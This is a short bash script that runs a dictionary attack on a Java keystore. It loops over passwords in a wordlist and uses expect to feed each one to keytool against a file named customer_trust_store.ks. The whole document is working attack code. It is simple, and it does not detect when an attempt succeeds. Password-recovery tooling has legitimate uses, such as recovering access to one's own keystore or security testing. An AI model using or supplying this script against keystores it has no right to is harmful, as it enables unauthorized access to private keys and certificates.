#! /bin/bash
# Author: Jesus Alatorre S
# License: GPLv3
# Summary:  This script execute a dictionary attack against the typical java ".keystore" files
#           Just provide the path to the keystore and the dictionary and will try to unlock
#           the keystore with all the password of the dictionary
# sh -x crack.sh 

for usuario in ` cat charList.txt`;
 do 
    export v=${usuario}; 
    expect -c 'spawn /usr/java/default/bin/keytool -list -v -keystore customer_trust_store.ks;
    expect "Enter keystore password:"; 
    send "$env(v)\n"; 
    interact;';
 done